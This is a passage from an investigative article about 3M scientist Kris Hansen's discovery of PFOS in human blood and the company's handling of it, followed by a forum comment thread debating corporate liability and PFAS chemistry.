type up her notes for him. She remembers him telling her not to email them. (In response to questions about Hansen’s account, Bacon said that he didn’t remember specifics. When I called Newmark, he told me that he could not remember her or anything about PFOS. “It’s been a very long time, and I’m in my mid-80s, and just do not remember stuff that well,” he said.) A few months later, in early 1999, Bacon invited Hansen to an extraordinary meeting: She would have the chance to present her findings to 3M’s CEO, Livio D. DeSimone. Hansen spent several days rehearsing while driving and making dinner. On the day of the meeting, she took an elevator up to the executive suite; her stomach turned as a secretary pointed her to a conference room. Men in suits sat around a long table. Her boss, Bacon, was there. DeSimone, a portly man with white hair, sat at the head of the table. A photo that Kris Hansen saved shows her father, Paul, with 3M CEO Livio D. DeSimone. Almost as soon as Hansen placed her first transparency on the projector, the attendees began interrogating her: Why did she do this research? Who directed her to do it? Whom did she inform of the results? The executives seemed to view her diligence as a betrayal: Her data could be damaging to the company. She remembers defending herself, mentioning Newmark’s similar work in the ’70s and trying, unsuccessfully, to direct the conversation back to her research. While the executives talked over her, Hansen noticed that DeSimone’s eyes had closed and that his chin was resting on his dress shirt. The CEO appeared to have fallen asleep. (DeSimone died in 2017. A company spokesperson did not answer my questions about the meeting.) After that meeting, Hansen remembers learning from Bacon that her job would be changing. She would only be allowed to do experiments that a supervisor had specifically requested, and she was to share her data with only that person. She would spend most of her time analyzing samples for studies that other employees were conducting, and she should not ask questions about what the results meant. Several members of her team were also being reassigned. Bacon explained that a different scientist at 3M would lead research into PFOS going forward. Hansen felt that she was being punished and struggled not to cry. Even as Hansen was being sidelined, the results of her research were quietly making their way into the files of the Environmental Protection Agency. Since the ’70s, federal law has required that companies tell the EPA about any evidence indicating that a company’s products present “a substantial risk of injury to health or the environment.” In May 1998, 3M officials notified the agency, without informing Hansen, that the company had measured PFOS in blood samples from around the U.S. — a clear reference to Hansen’s work. It did not mention its animal research from the ’70s, and it said that the chemical caused “no adverse effects” at the levels the company had measured in its workers. A year later, 3M sent the EPA another letter, again without telling Hansen. This time, it informed the agency about the 14 other fluorochemicals, several of them made by 3M, that Hansen’s team had detected in human blood. The company reiterated that it did not believe that its products presented a substantial risk to human health. Hansen recalls that in the summer of 1999, at an annual picnic that her parents hosted for 3M scientists, she was grilling corn when one of the creators of Scotchgard, a gray-haired man in glasses, confronted her. He accused her of trying to tear down the work of her colleagues. Did it make her feel powerful ruining other people’s careers? he asked. Hansen didn’t know how to respond, and he walked away. Several of Hansen’s superiors had stopped greeting her in the hallways. When she presented a poster of her research at a 3M event, nobody asked her about it. She lost her appetite, and her pleated pants grew baggy. She started to worry that an angry co-worker might confront or even harm her in the company’s dark parking lot. She got into the habit of calling her husband before walking to her car. A year after Hansen’s meeting with the CEO, 3M, under pressure from the EPA, made a very costly decision: It was going to discontinue its entire portfolio of PFOS-­related chemicals. In May 2000, for the first time, 3M officials revealed to the press that it had detected the chemical in blood banks. One executive claimed that the discovery was a “complete surprise.” The company’s medical director told The New York Times, “This isn’t a health issue now, and it won’t be a health issue.” But the newspaper also quoted a professor of toxicology. “The real issue is this stuff accumulates,” the professor said. “No chemical is totally innocuous, and it seems inconceivable that anything that accumulates would not eventually become toxic.” Hansen was now pregnant with twins. Although she was heartened by 3M’s announcement — she saw it as evidence that her work had forced the company to act — she was also ready to leave the environmental lab, where she felt marginalized. After giving birth, she joined 3M’s medical devices team. But first, she decided to have one last blood sample tested for PFOS: her own. The results showed one of the lowest readings she’d seen in human blood. Immediately, she thought of the rats that had passed the chemical on to their pups. Hansen told me that, for the next 19 years, she avoided the subject of fluorochemicals with the same intensity with which she had once pursued it. She focused on raising her kids and coaching a cross-country ski team; she worked a variety of jobs at 3M, none related to fluorochemicals. In 2002, when 3M announced that it would be replacing PFOS with another fluorochemical, PFBS, Hansen knew that it, too, would remain in the environment indefinitely. Still, she decided not to involve herself. She skipped over articles about the chemicals in scientific journals and newspapers, where they were starting to be linked to possible developmental, immune system and liver problems. (In 2006, after the EPA accused 3M of violating the Toxic Substances Control Act, in part by repeatedly ­failing to disclose the harms of fluorochemicals promptly, the company agreed to pay a small penalty of $1.5 million, without admitting wrongdoing.) During that time, forever chemicals gained a new scientific name — per- and polyfluoroalkyl substances, or PFAS, an acronym that is vexingly similar to the specific fluorochemical PFOS. A swath of 150 square miles around 3M’s headquarters was found to be polluted with PFAS; scientists discovered PFOS and PFBS in local fish and various fluorochemicals in water that roughly 125,000 Minnesotans drank. Hansen’s husband, Peter, told me that, when friends asked Hansen about PFAS, she would change the subject. Still, she repeatedly told him — and herself — that the chemicals were safe. First image: Hansen. Second image: A sign warns against consuming fish from Eagle Point Lake in Lake Elmo Park Reserve because of PFAS contamination. In the 2016 book “Secrecy at Work,” two management theorists, Jana Costas and Christopher Grey, argue that there is nothing inherently wrong or harmful about keeping secrets. Trade secrets, for example, are protected by federal and state law on the grounds that they promote innovation and contribute to the economy. The authors draw on a large body of sociological research to illustrate the many ways that information can be concealed. An organization can compartmentalize a secret by slicing it into smaller components, preventing any one person from piecing together the whole. Managers who don’t want to disclose sensitive information may employ “stone-faced silence.” Secret-keepers can form a kind of tribe, dependent on one another’s continued discretion; in this way, even the existence of a secret can be kept secret. Such techniques become pernicious, Costas and Grey write, when a company keeps a dark secret, a secret about wrongdoing. Certain unpredictable events — a leak, a lawsuit, a news story — can start to unspool a secret. In the case of forever chemicals, the unspooling began on a cattle farm. In 1998, a West Virginia farmer told a lawyer, Robert Bilott, that wastewater from a DuPont site seemed to be poisoning his cows: They had started to foam at the mouth, their teeth grew black and more than a hundred eventually fell over and died. Bilott sued and obtained tens of thousands of internal documents, which helped push forever chemicals into the public consciousness. The documents revealed that the farm’s water contained PFOA, the fluorochemical that DuPont had bought from 3M, and that both companies had long understood it to be toxic. (The lawsuit, which ended in a settlement, was dramatized in the film “Dark Waters,” starring Mark Ruffalo as Bilott.) Bilott later sued 3M over contamination in Minnesota, but the judge prohibited discussion of health repercussions; a jury ultimately decided in 3M’s favor. Finally, in 2010, the Minnesota attorney general’s office filed its own suit, alleging that 3M had harmed the environment and polluted drinking water. The company paid $850 million in a settlement, without an admission of fault or liability. The AG also released thousands more internal 3M records to the public. The AG’s records helped me report a series of stories for The Intercept about forever chemicals. Much of my reporting, which started in 2015, focused on what 3M and DuPont knew, even as they continued to produce PFAS. But, as I reported on the cover-up, I wondered what it meant for a sprawling multinational company to know that its products were dangerous. Who knew? How much, exactly, did they know? And how had the company kept its secret? For many years, no one inside 3M would agree to speak with me. Then, in 2021, John Oliver did a segment on his comedy news show, “Last Week Tonight,” about forever chemicals. The segment, which mentioned my reporting, said that they could cause cancer, immune-system issues and other problems. “The world is basically soaked in the Devil’s piss right now,” Oliver said. “And not in a remotely hot way.” One of Hansen’s former professors sent her the segment, and Hansen watched it at her kitchen table — a moment that would eventually lead her to me. “This actually made me sad as there are so many inaccuracies,” Hansen wrote to her professor in response. But, when the professor asked her what was incorrect, Hansen didn’t know what to say. For the first time, she Googled the health effects of PFOS. Hansen was deeply troubled by what she read. One paper, published in 2012 in the Journal of the American Medical Association, found that, in children, as PFOS levels rose so did the chance that vaccines were ineffective. Children with high levels of PFOS and other fluorochemicals were more likely to experience fevers, according to a 2016 study. Other research linked the chemicals to increased rates of infectious diseases, food allergies and asthma in children. Dozens of scientific papers had found that, in adults, even very low levels of PFOS could interfere with hormones, fertility, liver and thyroid function, cholesterol levels and fetal development. Even PFBS, the chemical that 3M chose as a replacement for PFOS, caused developmental and reproductive irregularities in animals, according to the Minnesota Department of Health. Reading these studies, Hansen felt a paradoxical kind of relief: As bad as PFOS seemed to be, at least independent scientists were studying it. But she also felt enraged at the company and at herself. For years, she had repeated the company’s claim that PFOS was not harmful. “I’m not proud of that,” she told me. She felt “dirty” for ever collecting a 3M paycheck. When she read the documents released by the Minnesota AG, she was horrified by how much the company had known and how little it had told her. She found records of studies that she had conducted, as well as the typed notes from her meeting with Newmark. In October 2022, after Hansen had been at 3M for 26 years, her job was eliminated, and she chose not to apply for a new one. Three months later, she wrote me an email, offering to speak about what she had witnessed inside the company. “If you’d be interested in talking further, please let me know,” she wrote. The next day, we had the first of dozens of conversations. When Hansen first told me about her experiences, I felt conflicted. Her work seemed to have helped force 3M to stop making a number of toxic chemicals, but I kept thinking about the 20 years in which she had kept quiet. During my first visit to Hansen’s home, in February 2023, we sat in her kitchen, eating bread that her husband had just baked. She showed me pictures of her father and shared a color-coded timeline of 3M’s history with forever chemicals. On a bitterly cold walk in a local park, we tried to figure out if any of her colleagues, besides Newmark, had known that PFOS was in everyone’s blood. She often sprinkled her stories with such Midwesternisms as “holy ­buckets!” Hansen at her home in Minnesota During my second trip, this past August, I asked her why, as a scientist who was trained to ask questions, she hadn’t been more skeptical of claims that PFOS was harmless. In the awkward silence that followed, I looked out the window at some hummingbirds. Hansen’s superiors had given her the same explanation that they gave journalists, she finally said — that factory workers were fine, so people with lower levels would be, too. Her specialty was the detection of chemicals, not their harms. “You’ve got literally the medical director of 3M saying, ‘We studied this, there are no effects,’” she told me. “I wasn’t about to challenge that.” Her income had helped to support a family of five. Perhaps, I wondered aloud, she hadn’t really wanted to know whether her company was poisoning the public. To my surprise, Hansen readily agreed. “It almost would have been too much to bear at the time,” she told me. 3M had successfully compartmentalized its secret; Hansen had only seen one slice. (When I sent the company detailed questions about Hansen’s account, a spokesperson responded without answering most of them or mentioning Hansen by name.) Recently, I thought back on Taves and Guy, the academic scientists who, in the ’70s, came so close to proving that 3M’s chemicals were accumulating in humans. Taves is 97, but when I called him he told me that he still remembers clearly when company representatives visited his lab at the University of Rochester. “They wanted to know everything about what we were doing,” he told me. But the exchange was not reciprocal. “I soon found out that they weren’t going to tell me anything.” 3M never confirmed to Taves or Guy, who was a postdoctoral student at the time, that its fluorochemicals were in human blood. “I’m sort of kicking myself for not having followed up on this more, but I didn’t have any research money,” Guy told me. He eventually became a dentist to support his wife and family. (He died this year at 81.) Taves, too, left the field, to become a psychiatrist, and the trail ended there. Last year, while reading about the thousands of PFAS-related lawsuits that 3M was facing, I was intrigued to learn that one of them, filed by cities and towns with polluted water, had produced a new set of internal 3M documents. When I requested several from the plaintiff’s legal team, I saw two names that I recognized. In a document from 1991, a 3M scientist talked about using a mass spectrometer — the same tool that Hansen would use years later — to devise a technique for measuring PFOS in biological fluid. The author was Jim Johnson — and he had sent the report to his boss, Dale Bacon. This revelation made me gasp. Johnson had been Hansen’s first boss and had instigated her research into PFOS. Bacon had questioned her findings and ultimately told her to stop her work. (In a sworn deposition, Bacon said that by the ’80s he had heard, during a water-cooler chat with a colleague, that Taves and Guy had found PFOS in human blood.) What I couldn’t understand was why Johnson would ask Hansen to investigate something that he had already studied himself — and then act surprised by the results. Jim Johnson, who is now an 81-year-old widower, lives with several dogs in a pale-yellow house in North Dakota. When I first called him, he said that he had begun researching PFOS in the ’70s. “I did a lot of the very original work on it,” he told me. He said that when he saw the chemical’s structure he understood “within 20 minutes” that it would not break down in nature. Shortly thereafter, one of his experiments revealed that PFOS was binding to proteins in the body, causing the chemical to accumulate over time. He told me that he also looked for PFOS in an informal test of blood from the general population, around the late ’70s, and was not surprised when he found it there. Johnson initially cited “480 pounds of dog” as a reason that I shouldn’t visit him, but he later relented. When I arrived, on a chilly day in November, we spent a few minutes standing outside his house, watching Snozzle, Sadie and Junkyard press their slobbery snouts against his living ­room window. Then we decamped to the nearest IHOP. Johnson, who was dressed in jeans and a flannel shirt, was so tall that he couldn’t comfortably fit into a booth. We sat at a table and ordered two bottomless coffees. In an experiment in the early ’80s, Johnson fed a component of Scotchban to rats and found that PFOS accumulated in their livers, a result that suggested how the chemical would behave in humans. When I asked why that mattered to the company, he took a sip of coffee and said, “It meant they were screwed.” At the time, Johnson said, he didn’t think PFOS caused significant health problems. Still, he told me, “it was obviously bad,” because man-made compounds from household products didn’t belong in the human body. He said that he argued against using fluorochemicals in toothpaste and diapers. Contrac­tors working for 3M had shaved rabbits, he said, and smeared them with the company’s fluorochemicals to see if PFOS showed up in their bodies. “They’d send me the livers and, yup, there it was,” he told me. “I killed a lot of rabbits.” But he considered his efforts largely futile. “These idiots were already putting it in food packaging,” he said. Johnson told me, with seeming pride, that one reason he didn’t do more was that he was a “loyal soldier,” committed to protecting 3M from liability. Some of his assignments had come directly from company lawyers, he added, and he couldn’t discuss them with me. “I didn’t even report it to my boss, or anybody,” he said. “There are some things you take to your grave.” At one point, he also told me that, if he were asked to testify in a PFOS-related lawsuit, he would probably be of little help. “I’m an old man, and so I think they would find that I got extremely forgetful all of a sudden,” he said, and chuckled. Out the windows of IHOP, I watched a light dusting of snow fall on the parking lot. In Johnson’s telling, a tacit rule prevailed at 3M: Not all questions needed to be asked, or answered. His realization that PFOS was in the general public’s blood “wasn’t something anyone cared to hear,” he said. He wasn’t, for instance, putting his research on posters and expecting a warm reception. Over the years, he tried to convince several executives to stop making PFOS altogether, he told me, but they had good reason not to. “These people were selling fluorochemicals,” he said. He retired as the second-highest-­ranked scientist in his division, but he claimed that important business decisions were out of his control. “It wasn’t for me to jump up and start saying, ‘This is bullshit!’” he said, and he was “not really too interested in getting my butt fired.” And so his portion of 3M’s secret stayed in a compartment, both known and not known. 3M is among the largest employers in Minnesota. Johnson said that he eventually tired of arguing with the few colleagues with whom he could speak openly about PFOS. “It was time,” he said. So he hired an outside lab to look for the chemical in the blood of 3M workers, knowing that it would also test blood bank samples for comparison — the first domino in a chain that would ultimately take the compound off the market. Oddly, he compared the head of the lab to a vending machine. “He gave me what I paid for,” Johnson said. “I knew what would happen.” Then Johnson tasked Hansen with something that he had long avoided: going beyond his initial experiments and meticulously documenting the chemical’s ubiquity. While Hansen took the heat, he took early retirement. Johnson described Hansen as though she were a vending machine, too. “She did what she was supposed to do with the tools I left her,” he said. I pointed out that Hansen had suffered professionally and personally, and that she now feels those experiences tainted her career. “I didn’t say I was a nice guy,” Johnson replied, and laughed. After four hours, we were nearing the bottom of our bottomless coffees. Johnson has strayed from evidence-­based science in recent years. He now believes, for instance, that the theory of evolution is wrong, and that COVID-19 vaccines cause “turbo-cancers.” But his account of what happened at 3M closely matched Hansen’s, and when I asked him about meetings and experiments described in court documents he remembered them clearly. When I called Hansen about my conversation with Johnson, she grew angrier than I’d ever heard her. “He knew the whole time!” she said. Then she had to get off the phone for an appointment. “So glad I’m going to see my therapist,” she added, and hung up. I once thought of secrets as discrete, explosive truths that a heroic person could suddenly reveal. In the 1983 film “Silkwood,” which is based on real events, Karen Silkwood, a worker at a plutonium plant, assembles a thick folder documenting her employer’s shoddy safety practices; while driving to share them with a reporter, she dies in a mysterious one-car crash. In another adaptation of a true story, the 2015 film “Spotlight,” a source delivers a box of critical documents to The Boston Globe, helping the paper to publish an investigation into child sexual abuse within the Catholic Church. Talking to Hansen and Johnson, though, I saw that the truth can come out piecemeal over many years, and that the same people who keep secrets can help divulge them. Some slices of 3M’s secret are only now coming to light, and others may never come out. Between 1951 and 2000, 3M produced at least 100 million pounds of PFOS and chemicals that degrade into PFOS. This is roughly the weight of the Titanic. After the late ’70s, when 3M scientists established that the chemical was toxic in animals and was accumulating in humans, it produced millions of pounds per year. Scientists are still struggling to grasp all the biological consequences. They have learned, just as Johnson did decades ago, that proteins in the body bind to PFOS. It enters our cells and organs, where even tiny amounts can cause stress and interfere with basic biological functions. It contributes to diseases that take many years to develop; at the time of a diagnosis, one’s PFOS level may have fallen, making it difficult to establish causation with any certainty. The other day, I called Brad Creacey, who became an Air Force firefighter in the ’70s at the age of 18. He told me that several times a year, for practice, he and his comrades put on rubber boots and heavy silver uniforms that looked like spacesuits. Then a “torch man,” holding a stick tipped with a burning rag, ignited jet fuel that had been poured into an open-air pit. To extinguish the 100-foot-tall flames, Creacey and his colleagues sprayed them with aqueous film-forming foam, or AFFF. 3M manufactured it from several forever chemicals, including PFOS. Creacey remembers that AFFF felt slick and sudsy, almost like soap, and dried out the skin on his hands until it cracked. To celebrate his last day on a military base in Germany, his friends dumped a ceremonial bucket on him. Only later, after working with firefighting foam at an airport in Monterey, California, did he start to wonder if a string of ailments — cysts on his liver, a nodule near his thyroid — were connected to the foam. He had high cholesterol, which diet and exercise were unable to change. Then he was diagnosed with thyroid cancer. “It makes me feel like I was a lab rat, like we were all disposable,” Creacey told me. “I’ve lost faith in human beings.” To celebrate Air Force firefighter Brad Creacey’s last day on a military base in Germany, his friends doused him with a bucket of the same aqueous film-forming foam they used to extinguish fires. Later, Creacey wondered if a string of ailments was connected to his many years of contact with the foam. Credit: Courtesy of Brad Creacey It may be tempting to think of Creacey and his peers as unwitting research subjects; indeed, recent studies show that PFOS is associated with an increased risk of thyroid cancer and, in Air Force servicemen, an elevated risk of testicular cancer. But it is probably more accurate to say that we are all part of the experiment. Average levels of PFOS are falling, but nearly all people have at least one forever chemical in their blood, according to the Centers for Disease Control and Prevention. “When you have a contaminated site, you can clean it up,” Elsie Sunderland, an environmental chemist at Harvard University, told me. “When you ubiquitously introduce a toxicant at a global scale, so that it’s detectable in everyone ... we’re reducing public health on an incredibly large scale.” Once everyone’s blood is contaminated, there is no control group with which to compare, making it difficult to establish responsibility. New health effects continue to be discovered. Researchers have found that exposure to PFAS during pregnancy can lead to developmental delays in children. Numerous recent studies have linked the chemicals to diabetes and obesity. This year, a study discovered 13 forever chemicals, including PFOS, in weeks-old fetuses from terminated pregnancies and linked the chemicals to biomarkers associated with liver problems. A team of New York University researchers estimated in 2018 that the costs of just two forever chemicals, PFOA and PFOS — in terms of disease burden, disability and health-care expenses — amounted to as much as $62 billion in a single year. This exceeds the current market value of 3M. Philippe Grandjean, a physician who helped discover that PFAS harm the immune system, believes that anyone exposed to these chemicals — essentially everyone — may have an elevated risk of cancer. Our immune systems often find and kill abnormal cells before they turn into tumors. “PFAS interfere with the immune system, and likely also this critical function,” he told me. Grandjean, who served as an expert witness in the Minnesota AG’s case, has studied many environmental contaminants, including mercury. The impact of PFAS was so much more extreme, he said, that one of his colleagues initially thought it was the result of nuclear radiation. In April, the EPA took two historic steps to reduce exposure to PFAS. It said that PFOS and PFOA are “likely to cause cancer” and that no level of either chemical is considered safe; it deemed them hazardous substances under the Superfund law, increasing the government’s power to force polluters to clean them up. The agency also set limits for six PFAS in drinking water. In a few years, when the EPA begins enforcing the new regulations, local utilities will be required to test their water and remove any amount of PFOS or PFOA which exceeds four parts per trillion — the equivalent of one drop dissolved in several Olympic swimming pools. 3M has produced enough PFOS and chemicals that degrade into PFOS to exceed this level in all of the freshwater on earth. Meanwhile, many other PFAS continue to be used, and companies are still developing new ones. Thousands of the compounds have been produced; the Department of Defense still depends on many for use in explosives, semiconductors, cleaning fluids and batteries. PFAS can be found in nonstick cookware, guitar strings, dental floss, makeup, hand sanitizer, brake fluid, ski wax, fishing lines and countless other products. In a statement, a 3M spokesperson told me that the company “is proactively managing PFAS,” and that 3M’s approach to the chemicals has evolved along with “the science and technology of PFAS, societal and regulatory expectations, and our expectations of ourselves.” He directed me to a fact sheet about their continued importance in society. “These substances are critical to multiple industries — including the cars we drive, planes we fly, computers and smart phones we use to stay connected, and more,” the fact sheet read. Recently, 3M settled the lawsuit filed by cities and towns with polluted water. It will pay up to $12.5 billion to cover the costs of filtering out PFAS, depending on how many water systems need the chemicals removed. The settlement, however, doesn’t approach the scale of the problem. At least 45% of U.S. tap water is estimated to contain one or more forever chemicals, and one drinking water expert told me that the cost of removing them all would likely reach $100 billion. In 2022, 3M said that it would stop making PFAS and would “work to discontinue the use of PFAS across its product portfolio,” by the end of 2025 — a pledge that it called “another example of how we are positioning 3M for continued sustainable growth.” But it acknowledged that more than 16,000 of its products still contained PFAS. Direct sales of the chemicals were generating $1.3 billion annually. 3M’s regulatory filings also allow for the possibility that a full phaseout won’t happen — for example, if 3M fails to find substitutes. “We are continuing to make progress on our announcement to exit PFAS manufacturing,” 3M’s spokesperson told me. The company and its scientists have not admitted wrong­doing or faced criminal liability for producing forever chemicals or for concealing their harms. A photo of the Hansens: Paul, Kris and her mother, Nancy Hansen often wonders what her father would say about 3M if he were still alive. A few years ago, he began to show signs of dementia, which worsened during the COVID-19 pandemic. Every time Hansen explained to him that a novel coronavirus was sickening people around the world, he asked how he might contribute — forgetting that the N95 mask he helped to create was already protecting millions of people from infection. When he died, in January 2021, Hansen noticed some Coban wrap on his arm. It was shielding his delicate skin from tears, just as he had designed it to. “He invented that,” Hansen told the hospice nurse, who smiled politely. After she left 3M, Hansen began volunteering at a local nature preserve, where she works to clear paths and protect native plants. Last August, she took me there, and we walked to a creek where she often spends time. The water is home to three species of trout, she told me. It is also polluted by forever chemicals that 3M once dumped upstream. Read More Illinois School Districts Sent Kids to a For-Profit Out-of-State Facility That Isn’t Vetted or Monitored For most of our hike, a thick wall of flowers — purple joe-pye weed and goldenrod — made it impossible to see the creek bank. Then we came to a wooden bench. I climbed on top of it and looked down on the creek. As I listened to the gurgling of water and the buzzing of insects, I thought I understood why Hansen liked to come here. It was too late to save the creek from pollution; 3M’s chemicals could be there for thousands of years to come. Hansen just wanted to appreciate what was left and to leave the place a little better than she’d found it. The conservancy where Kris Hansen began volunteering after leaving 3M.

That's not sufficient though. The people who did the bad acts need to be punished, but the owners who profited from the bad acts need to be punished too. If you don't do that, you just create situations like Amazon: set a sounds-good internal policy but have internal incentives for employees to violate it (e.g. exploit 3rd party seller data to unfairly compete with them) and lax enforcement, then fire the employees as scapegoats when caught to deflect blame when the violations become a PR or legal problem. So some harsh action needs to be taken against the owners and the shareholders. A \"corporate death penalty\" doesn't really work, because shareholders can always sell. You don't want the guy responsible to profit, while some innocent schmuck gets punished because he happened to be holding the bag when the music stopped. You need action against the shareholders who were owners at the time of the bad acts. Instead, since we have computers with big disks now, there needs to be a registry that tracks the historical beneficial owners of a company's stock. Then when something worthy of a \"corporate death penalty\" happens, those people are tracked down, fined, and any profits they enjoyed get clawed back. If they go bankrupt, tough: as owners, they should have proposed or voted for shareholder proposals to keep the management under control. Of course there would be some finer details to work out (e.g. breaking the veil on shell corporations, policies to deal with straw ownership, letting other shareholders off the hook if some small group (e.g. founders) have complete voting control of the company), but I think the idea is workable if you don't consciously let clever-assholes exploit loopholes reply lacksconfidence 4 hours agorootparentOver half of the stock market is held in the retirement accounts of everyday people.

CalPERS manages the largest public pension fund in the United States, with more than $469 billion in assets under management as of June 30, 2021. reply blegr 2 hours agorootparentprevSame as a bank? If you lie to investors and get yourself nuked, the owners or what passes for owners get wiped out, which is normal. The people who really qualify as victims are those who were harmed and didn't benefit from the fraud, which is everyone else. Sure, some people would lose money but didn't intend to cause harm.

The devil, however, is in the implementation details; many of which tend to cross increasingly hairy and controversial lines. Things like limits on freedom from compelled speech for corporations with regard to privately funded research. Revocation of trade secrets (therein tend to lay the fertile ground for corruption). Mandatory recordkeeping practices that start violating the human dignity of everyone to be free from constant scrutiny, as it is only with complete comms records that one could actually piece together the facts of what happened; which still runs into the issue of criminals gonna crime; so what you effectively do is partition your population into two groups.

The people who did the bad acts need to be punished, but the owners who profited from the bad acts need to be punished too. If you don't do that, you just create situations like Amazon: set an sounds-good internal policy but have internal incentives for employees to violate it (e.g. exploit 3rd party seller data to unfairly compete with them), then fire the employees as scapegoats when caught to deflect blame. So some harsh action needs to be taken the owners the shareholders. And sure; but is it possible to determine when this incentive was created? If it is, can't it be stopped the moment it happens?

That example was meant as an illustration of using scapegoats to deflect consequences, and why the consequences have to bubble up beyond an individual doing a bad act on behalf of the corporation. I'm not sure what you mean by \"the shareholders are the incentive.\" My mental model for how this would work legally with shareholders would be modeled more on torts like negligence than on criminal law.

The 401k in the USA is a good example. I don’t think punishing stock holders makes any more sense than punishing all of Germany after WW1 did. You need to cut the head off the snake, not nibble at the tail. A hypothetical corporate death penalty should start at the top, then cascade down some amount of “tiers” down the executive chain.

You need action against the shareholders who were owners at the time of the bad acts. You could always tailor this so the penalization only applies to private equity and throw in a lookback. That would encourage companies to go public (which, IMO, is a good thing) and would encourage private equity to be responsible. You could still kill a public company that violates the public trust, you just don't have to penalize shareholders in that case because they are likely to not have the same level of information/control as a private equity holder/owner would. reply chrisjj 1 hour agorootparentprev> the owners who profited from the bad acts need to be punished too.

You could just burn them all down I guess, but if the company did something wrong that we want compensation for, it usually makes more sense to try and maximize the value you can get. * A large manufacturing company is going to have factories, distributor contracts, etc. with no liquid secondary market. The value-maximizing play is most likely going to be selling the package to an existing company or setting up a new one, rather than holding a piecemeal fire sale. * But if you have a new company/division with all of the old company's assets, doesn't that mean you've just renamed the old company? Kinda, yeah.

The people making these decisions are sociopaths. In order to provide a proper safe guard against future bad behavior target the behavior by attacking the person. More specifically hold the executives, as well as their primary staff, personally liable for the decisions they make. Criminal liability can be a factor, but what really hurts the sociopaths is civil restitution. Take money from their personal coffers to be redistributed to persons harmed while simultaneously destroying their reputations in the public. Do not punish the company, as this only punishes the remaining employees. Furthermore, nobody else is as typically well suited for applying corrective actions as the companies inflicting the original harms. If application of corrective actions financially destroys a given company then let that be your corporate death penalty. reply NoMoreNicksLeft 4 hours agorootparentprevA company is nothing more than a group of people, working towards a single goal, no?

The janitor at one of Dupont's buildings isn't to blame for this, at least under most theories of culpability. But there is a core subset of people who are, and whether they are punished individually or not, at the very minimum, they shouldn't be allowed to participate in business (any business) again. Otherwise, they run off and get C-level jobs (or really, vp/director-level jobs and up), and perform more of the same stunts. Not that it matters, the companies that commit these sorts of crimes are always large enough that their political sway would protect them even if there were laws on the books that could theoretically dismantle them. And certainly, all such companies collectively have more than enough mojo to prevent the passage of such a law. reply wumbo 4 hours agorootparentIf the janitor knew, but withheld the publically valuable information out of fear, they should still get some amount of punishment.

(And especially if you see the top comment, and disagree with it vehemently, you might dig through the replies to that comment and start posting rebuttals. You might get tired of the topic before you get down to the 2nd-top comment, and leave the submission or the site entirely.) Being the top comment is self-reinforcing, even if other comments actually do reflect the majority opinion better. I don't think we can say that the top comment is the majority/prevailing opinion. That's just the opinion that, due to lucky/random circumstances, got the most initial views and upvotes by people who agree, which then feedback-looped itself into staying the top comment. reply kelnos 22 minutes agorootparentprev> I think it's totally fair to call the top comment (most upvoted) the \"prevailing opinion\".

It covers everything from Teflon (which is perhaps the most chemically inert substance ever created) fluorine-containing acids like PFOA, which are water soluble and bioavailable, and tend to accumulate in the environment. Because of this, you'll see all sorts of silly claims on every thread related to this topic, claiming that (for example) fry pans are toxic. This is silly, and driven by a poor understanding of chemistry, as well as some unfortunate hack scientists who continue to promote the idea that \"alkyl-fluorine-containing = toxic\", which isn't supported by evidence. You can see this hyperbole in the sibling comment, where the quote \"man-made compounds from household products didn’t belong in the human body\" is asserted as some kind of fact.

Furthermore, endocrine disruptors seem to exhibit an unusual dose response curve, where lower doses may be worse than higher doses. In fact, getting a PFOS injection at a well calculated dose could be the kind of stunt a CEO could pull.

As in filtering out heavy metals, PFOS, microplastics abd toxins? reply tomxor 5 hours agoparentBioaccumulatrion of PFOAs mainly occurs in the liver, kidneys, and blood [0] Maybe filtering blood would help other tissue by proxy, allowing the blood to hold more? but from what I understand PFOA doesn't just hang around in those organs inert, it binds to proteins which is why it can cause problems. Also consider that we probably accumulate most of this through ingestion, since it's in pretty much all food and water, but to differing concentrations. So we are constantly consuming this stuff in tiny quantities, but it's always there. People worry about things like teflon in non-stick pans and other products, but that's a product of PFOAs, i.e they were manufactured using them, they are not themselves PFOAs and do not readily break down into them just by handling them (you have to heat your pan to >250c roughly to get it to start vaporising the teflon into an aerosolised PFOA. So while the firefighting foam story is awful, most products are not themselves toxic, the real danger is in what the manufacturing processes has already released into the environment and is now part of the global food chain (particularly in sea food). In other words, it doesn't matter what you buy or use (personally at least), and we are all eating and drinking it. Any kind of blood filtering would be a continuous process, and it's not clear how effective it would be considering one of the primary routes to exposure is through ingestion, and how it readily binds to and disrupts various tissues in the body. I suspect anything that would help substantially reverse the process in the human body would need to be more active, e.g a drug that interacted with the PFOA either to render it harmless or reduce it's \"elimination half life\" (currently thought to be 3 years) to allow it to be released faster than we accumulate it.[0] https://en.wikipedia.org/wiki/Perfluorooctanoic_acid#Human_d... reply kgc 4 hours agorootparentIf we know what it binds to, could we just manufacture a lot of that and bind and destroy as much out of the environment as we could? reply tomxor 4 hours agorootparentPossibly, but I suspect it wont be that simple, and that the challenge will be finding something that not only interacts with the containment in a useful way, but does not further interact with the human body in a toxic or disruptive way. Because most of the harmful effects of PFOAs seem to be due to it being an endocrine disruptor, which means it messes with any hormonal system. I'm wondering if there would be a higher probability for chemicals we identify to bind to it to also be some kind of endocrine disruptor or have a hormonal interaction due to the close chemical relationships... then again, if it's similarly disruptive but at least reduces the half life and allows the body to release it, then perhaps that doesn't matter long term. i.e a little bit more poison to allow your body to release all of the poison. I'm totally unqualified to answer this question, biochemistry is extremely complex, just pointing out it's probably not that simple. [edit] Sorry I misread your comment as applying to the body. For the environment it's a different type of problem, the only known way to remove them is expensive indiscriminate filtering of water (i.e not specific to PFOA), reverse osmosis (basically using a huge amount of pressure).

The corporate veil needs to be not only eliminated, but reversed If a corporation is a collection of people driven by a charter, and that corporation commits a crime, the people who drove that decisions have two forms of protection from liability. One, criminal liability is in effect treated as diffuse and it is near impossible to charge any person for a crime. Two, assets not associated with the company are protected from liability involving the company's actions This is madness. When a collective of any kind commits a crime, this is conspiracy. If someone is a voting shareholder or board member or top-level executive of a company that did a crime, they should automatically be liable.

